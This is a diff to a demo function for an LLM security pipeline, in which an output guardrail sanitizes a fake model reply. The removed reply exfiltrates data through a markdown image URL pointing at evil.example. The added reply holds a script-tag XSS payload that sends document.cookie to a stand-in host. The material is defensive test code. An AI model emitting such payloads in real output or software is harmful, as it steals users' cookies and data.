@@ -34,7 +34,7 @@ def pipeline_demo():
     line("1. Request pipeline: guardrail -> DLP -> context -> (LLM) -> output")
     guard = PromptGuardrail()
     dlp = DLPScanner()
-    out = OutputGuardrail(allowed_url_domains=["internal.example"])
+    out = OutputGuardrail()  # safe by default: escapes model output
     audit = AuditLogger(agent_id="demo-bot", session_id="sess-1")
 
     user_input = "My email is jane.doe@example.com and my card is 4111 1111 1111 1111. Help!"
@@ -54,9 +54,10 @@ def pipeline_demo():
     )
     print(f"context built: {len(messages)} tagged messages")
 
-    fake_reply = "Sure! ![pixel](https://evil.example/leak?d=secret) Here is your answer."
+    # A model reply carrying an XSS payload — the safe default HTML-escapes it.
+    fake_reply = "Answer: <script>fetch('//evil/?c='+document.cookie)</script>"
     result = out.sanitize(fake_reply)
-    print("output sanitized:", result.sanitized_text)
+    print("output sanitized (XSS-safe):", result.sanitized_text)
     audit.log_output_check("user-42", passed=result.passed, violations=result.violations)
 
 
